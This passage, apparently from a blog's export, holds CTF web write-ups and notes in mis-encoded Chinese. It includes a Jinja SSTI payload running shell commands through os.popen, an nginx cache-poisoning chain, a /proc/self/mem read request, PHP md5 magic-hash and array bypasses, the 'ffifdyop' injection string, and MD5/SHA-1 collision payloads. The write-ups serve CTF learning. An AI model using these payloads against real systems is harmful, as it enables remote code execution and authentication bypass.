<p><img src="https://pic1.imgdb.cn/item/6879f54a58cb8da5c8c27f32.png"><br>ä¸€ç§æ˜¯æœ¬åœ°èµ·ç¯å¢ƒï¼Œåœ¨nginxé…ç½®æ–‡ä»¶åé¢åŠ ä¸Šä¸€æ®µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="code"><pre><span class="line">init_by_lua_block &#123;</span><br><span class="line">        # åœ¨æœ€ååŠ ä¸Šä¸€æ®µ</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">tostring</span>(flag))</span><br><span class="line">        <span class="keyword">local</span> ffi = <span class="built_in">require</span>(<span class="string">&quot;ffi&quot;</span>)</span><br><span class="line">        <span class="keyword">local</span> ptr = ffi.cast(<span class="string">&quot;const char*&quot;</span>, flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Address: &quot;</span>, <span class="built_in">tostring</span>(ptr))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°flagçš„å†…å­˜ä½ç½®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read_anywhere</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>Your_host</span><br><span class="line"><span class="attribute">X-Gateway-Password</span><span class="punctuation">: </span>test_password</span><br><span class="line"><span class="attribute">X-Gateway-Filename</span><span class="punctuation">: </span>/proc/self/mem</span><br><span class="line"><span class="attribute">X-Gateway-Start</span><span class="punctuation">: </span>0x7e07636f3000</span><br><span class="line"><span class="attribute">X-Gateway-Length</span><span class="punctuation">: </span>0x100000</span><br></pre></td></tr></table></figure></div>

<h2 id="best-profile"><a href="#best-profile" class="headerlink" title="best_profile"></a>best_profile</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">def route_ip_detail(username):</span><br><span class="line">    res = requests.get(f<span class="string">&quot;http://127.0.0.1/get_last_ip/&#123;username&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        return <span class="string">&quot;Get last ip failed.&quot;</span></span><br><span class="line">    last_ip = res.text</span><br><span class="line">    try:</span><br><span class="line">        ip = re.findall(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>, last_ip)</span><br><span class="line">        country = geoip2_reader.country(ip)</span><br><span class="line">    except (ValueError, TypeError):</span><br><span class="line">        country = <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">    template = f<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;IP Detail&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;div&gt;&#123;last_ip&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Country:&#123;country&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    return render_template_string(template)</span><br></pre></td></tr></table></figure></div>
<p>åœ¨<code>/ip_detail/&lt;string:username&gt;</code>è·¯ç”±ä¸­å­˜åœ¨ssti<br>é¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”è¦ä»¥ç‰¹å®šåç¼€åç»“å°¾ åç»­ç”¨æ¥webç¼“å­˜æŠ•æ¯’</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:5000;</span><br><span class="line">            <span class="attribute">proxy_cache</span> static;</span><br><span class="line">            <span class="attribute">proxy_cache_valid</span> <span class="number">200</span> <span class="number">302</span> <span class="number">30d</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> <span class="regexp">~ .*\.(js|css)?$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:5000;</span><br><span class="line">            <span class="attribute">proxy_cache</span> static;</span><br><span class="line">            <span class="attribute">proxy_cache_valid</span> <span class="number">200</span> <span class="number">302</span> <span class="number">12h</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åè°ƒç”¨<code>&quot;/&lt;string:username&gt;&quot;</code> æ¥å£æ¥ä¿å­˜å½“å‰çš„IPåœ°å€ã€‚<br>æœåŠ¡å™¨ä½¿ç”¨äº†Nginxä½œä¸ºåå‘ä»£ç†ï¼Œæ‰€ä»¥request.remote_addrè¿™ä¸ªå€¼å®é™…ä¸Šæ˜¯ä»X-Forwarded-Forè¿™ä¸ªHTTPè¯·æ±‚å¤´ä¸­è·å–çš„<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">cycler.__init__.__globals__.os.popen</span>(<span class="name">request.args.c</span>).read() &#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>è°ƒç”¨â€&#x2F;get_last_ip&#x2F;<a href="string:username">string:username</a>â€œæ¥å£æ¥ç¼“å­˜å“åº”ã€‚å½“ä¸‹æ¬¡æˆ‘ä»¬å†è°ƒç”¨è¿™ä¸ªæ¥å£æ—¶ï¼Œæˆ‘ä»¬ä¸å†éœ€è¦Cookieï¼ˆä¹Ÿå°±æ˜¯sessionï¼‰ï¼Œå› ä¸ºå“åº”å·²ç»è¢«Nginxç¼“å­˜äº†ã€‚<br>æœ€åè°ƒç”¨â€&#x2F;ip_detail&#x2F;<a href="string:username">string:username</a>â€œæ¥å£æ¥è§¦å‘SSTIæ¼æ´ã€‚</p>
<p>&#x2F;ip_detail&#x2F;user.bmp?c&#x3D;cat%20&#x2F;flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-webç¬”è®°</title>
    <url>/posts/59777.html</url>
    <content><![CDATA[<p>ä¸ªäººwebå°ç™½é¢˜åˆ·é¢˜ç¬”è®°</p>
<span id="more"></span>

<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><ul>
<li>åœ¨ä¿®æ”¹è¯·æ±‚å¤´çš„æ—¶å€™è€ƒè™‘åŠ ä¸ŠX-Forwarded-For: 127.0.0.1<br>X-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚å¤´å­—æ®µï¼Œé€šå¸¸ç”¨äºæ ‡è¯†å®¢æˆ·ç«¯çš„çœŸå®IPåœ°å€ï¼Œå³ä½¿è¯·æ±‚ç»è¿‡äº†å¤šä¸ªä»£ç†æˆ–è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ã€‚<br>åœ¨æµé‡åŒ…ï¼ˆç½‘ç»œæŠ“åŒ…ï¼‰ä¸­ï¼Œ<strong>Referer</strong>ï¼ˆæœ‰æ—¶å†™ä½œ <code>Refer</code>ï¼‰æ˜¯ HTTP è¯·æ±‚å¤´å­—æ®µä¹‹ä¸€ï¼Œä¸»è¦ç”¨äºæŒ‡ç¤ºå½“å‰è¯·æ±‚æ˜¯ä»å“ªä¸ªé¡µé¢è·³è½¬è¿‡æ¥çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯å‘Šè¯‰æœåŠ¡å™¨ï¼Œç”¨æˆ·æ˜¯ä»å“ªä¸ª URL è®¿é—®å½“å‰èµ„æºçš„ã€‚</li>
<li>æµè§ˆå™¨å†…éƒ¨ä½¿ç”¨ 32 ä½å¸¦ç¬¦å·çš„æ•´æ•°ï¼Œæ¥å‚¨å­˜æ¨è¿Ÿæ‰§è¡Œçš„æ—¶é—´ã€‚è¿™æ„å‘³ç€ setTimeout æœ€å¤šåªèƒ½æ¨è¿Ÿæ‰§è¡Œ 2147483647 æ¯«ç§’ï¼ˆ24.8 å¤©ï¼‰è¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå‘ç”Ÿæº¢å‡ºã€‚å¦‚æœæº¢å‡ºäº†ä¹‹åï¼Œç›¸å½“äºä» 0 å¼€å§‹ï¼Œæ•´æ•°ä¸Šæº¢</li>
<li><code>#</code>çš„urlç¼–ç æ˜¯%23 <code>&#39;</code>çš„æ˜¯%27 <code>\n</code>æ˜¯%0a <code>\t</code>æ˜¯%09 </li>
<li>åœ¨ PHP ä¸­ï¼Œ<code>$_REQUEST</code>Â æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ï¼Œç”¨äºè·å–é€šè¿‡å¤šç§æ–¹å¼ï¼ˆå¦‚Â <code>GET</code>ã€<code>POST</code>ã€<code>COOKIE</code>ï¼‰å‘é€åˆ°è„šæœ¬çš„æ•°æ®ã€‚</li>
<li><code>alert()</code>å‡½æ•°å¯ä»¥å†æ§åˆ¶å°è°ƒç”¨</li>
<li>httpè¯·æ±‚å¤´ä¸­çš„characterå°±æ˜¯cookieä¸­è®¾ç½® <code>Cookie: character=admin</code></li>
<li>å¦‚æœåœ¨å‘åŒ…çš„æ—¶å€™ï¼Œè¾“å…¥å°å·ä¼šé€ æˆæ¶ˆæ¯çš„æˆªæ–­ï¼Œå¯ä»¥ç”¨urlç¼–ç %3Bæ›¿ä»£</li>
<li>POSTè¯·æ±‚çš„é€šç”¨å¤´<br> <strong><code>Content-Type</code></strong><br>  æŒ‡å®šè¯·æ±‚ä½“çš„æ•°æ®æ ¼å¼ï¼Œå¸¸è§å€¼ï¼š(postè¯·æ±‚ä¸­å¿…é¡»è¦æœ‰)<ul>
<li><code>application/x-www-form-urlencoded</code>ï¼ˆè¡¨å•æ•°æ®ï¼Œé»˜è®¤æ ¼å¼ï¼‰</li>
<li><code>multipart/form-data</code>ï¼ˆæ–‡ä»¶ä¸Šä¼ æˆ–å¤æ‚è¡¨å•ï¼‰</li>
<li><code>application/json</code>ï¼ˆJSON æ•°æ®ï¼‰</li>
<li><code>text/xml</code>ï¼ˆXML æ•°æ®ï¼‰</li>
</ul>
</li>
<li>å¦‚æœåœ¨è¯·æ±‚å¤´ä¸­ç”¨base64çš„ç¼–ç è¦æŠŠ&#x3D;å’Œ&#x2F; urlç¼–ç </li>
</ul>
<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul>
<li>md5ç›¸åŒä½†æ˜¯å­—ç¬¦ä¸²ä¸åŒï¼š<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) = <span class="number">0</span>e462097431906509019562988736854</span><br><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) = <span class="number">0</span>e830400451993494058024219903391</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabg7XSs&#x27;</span>)</span></span> = <span class="number">0</span>e087386482136013740957780965295</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabC9RqS&#x27;</span>)</span></span> = <span class="number">0</span>e260421314791580664869894734725</span><br><span class="line">   <span class="number">314282422</span>    QLTHNDT   EEIZDOI</span><br></pre></td></tr></table></figure></div></li>
<li>åŒmd5éƒ½æ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">CbDLytmyGm2xQyaLNhWn</span></span><br><span class="line"></span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line"></span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure></div>
<ul>
<li>md5($str, false) è¿™æ˜¯md5çš„é»˜è®¤æƒ…å†µ è¿”å›32ä½16è¿›åˆ¶æ•°   å¦‚æœæ˜¯ md5($str, true)å°±è¿”å›16ä½äºŒè¿›åˆ¶æ•°<br>ffifdyop æ˜¯trueå‚æ•°æ—¶å€™çš„æ¼æ´  md5 (â€˜ffifdyopâ€™,true)&#x3D;â€™orâ€™6xxxxxx ä¹Ÿå°±æ˜¯oräº†ä¸€ä¸ªtrue</li>
<li>åœ¨ PHP ä¸­ï¼Œå¦‚æœ <code>md5()</code> ä½œç”¨äºä¸€ä¸ª<strong>æ•°ç»„</strong>ï¼Œå®ƒä¸ä¼šè®¡ç®—å“ˆå¸Œï¼Œè€Œæ˜¯è¿”å› <code>NULL</code>ï¼Œä½†<strong>ä¸ä¼šæŠ¥é”™</strong>ï¼ˆå› ä¸º <code>error_reporting(0);</code> å…³é—­äº†é”™è¯¯è¾“å‡ºï¼‰ã€‚<br>  æ‰€ä»¥å¯ä»¥ç”¨æ•°ç»„æ¥ç»•è¿‡md5éªŒè¯  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">ç”¨åˆ°åœºæ™¯ï¼š</span><br><span class="line">$a !== $b &amp;&amp; md5($a) === md5($b)</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>è¿ç®—ç¬¦</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>!=</code></td>
<td><strong>ä¸ç­‰äº</strong>ï¼ˆåªæ¯”è¾ƒå€¼ï¼Œå…è®¸ç±»å‹è½¬æ¢ï¼‰</td>
</tr>
<tr>
<td><code>!==</code></td>
<td><strong>å…¨ä¸ç­‰</strong>ï¼ˆå€¼æˆ–ç±»å‹ä¸åŒéƒ½ç®—ä¸ç­‰ï¼‰</td>
</tr>
</tbody></table>
</li>
<li><code>$md5[0]==md5($md5[0])</code>Â ç»•è¿‡å¯ä»¥ä½¿ç”¨ <code>0e215962017</code>ï¼Œå› ä¸ºè¿™ä¸ªå€¼çš„md5ä¹Ÿæ˜¯0eå¼€å¤´çš„</li>
<li>php md5å¼ºæ¯”è¾ƒ&#x3D;&#x3D;&#x3D; payload</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br><span class="line">b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>sha1å¼ºæ¯”è¾ƒ payload</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span>&amp;array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure></div>


<h2 id="phpçŸ¥è¯†"><a href="#phpçŸ¥è¯†" class="headerlink" title="phpçŸ¥è¯†"></a>phpçŸ¥è¯†</h2><ul>
<li><p>phpå‡½æ•°<code>glob(&#39;*&#39;);</code>æŸ¥çœ‹å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶ é…åˆ <code>highlight_file(&#39;$filename&#39;)</code>æŸ¥çœ‹</p>
</li>
<li><p>phpä¸­<code>&lt;?php</code>ç­‰ä»·äº<code>&lt;?=</code> å¯ä»¥å‡å°‘å­—ç¬¦æ•°</p>
</li>
